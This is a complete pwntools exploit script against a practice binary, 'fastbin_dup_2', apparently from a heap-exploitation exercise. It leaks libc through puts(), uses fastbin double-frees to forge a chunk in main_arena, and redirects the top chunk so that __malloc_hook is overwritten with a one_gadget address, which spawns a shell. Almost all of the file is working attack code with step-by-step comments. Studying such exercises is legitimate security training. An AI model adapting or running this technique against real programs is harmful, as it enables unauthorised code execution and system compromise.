#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_2")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1") # select 1
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ") # reach > again for prompt
    index += 1
    log.info(f"chunk number {index}")
    return index - 1


# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter("index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1
log.info(f"libc address: {libc.address}")

# =============================================================================

chunk_A = malloc(0x48, b"A"*0x78)
chunk_B = malloc(0x48, b"B"*0x78)

free(chunk_A)
free(chunk_B)
free(chunk_A)

main_arena = libc.sym.main_arena

log.info(f"main arena: {hex(main_arena)}")

chunk_C = malloc(0x78, b"C")
chunk_D = malloc(0x78, b"D")

free(chunk_C)
free(chunk_D)
free(chunk_C)

# let's control the next head of the fastbin

chunk_C = malloc(0x78, p64(0x51))
chunk_D = malloc(0x78, p64(0))
chunk_C = malloc(0x78, b"-s\0")

# right now, the head of the 0x80 fastbin will be 0x0000000000000051. This Is Good !

# have the next allocation allocate a fake chunk with a valid 0x51 size that will be located in the main arena
chunk_A = malloc(0x48, p64(main_arena+0x38))
chunk_B = malloc(0x48, p64(0))
chunk_A = malloc(0x48, p64(0))

# overidding the top_chunk pointer
# We have to make sure that the top_chunk will have a valid size.
# For this purpose we can take advantage of the leading 0x000000000000007f before the __malloc_hook
# note that there is a check of malloc that the size of top_chunk is not bigger than the max_size of the system
buf = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p64(libc.sym.__malloc_hook - 0x28 + 0x08 - 0x03)

malloc(0x48, buf)

# allocate chunk that will be served from the overriden top_chunk

buf = b'\x00' * 0x13 + p64(libc.address + 0xe1fa1)

# override __mallc_hook

malloc(0x28, buf)

# next malloc will give us a beautiful shell

malloc(1, b"")

# =============================================================================

io.interactive()
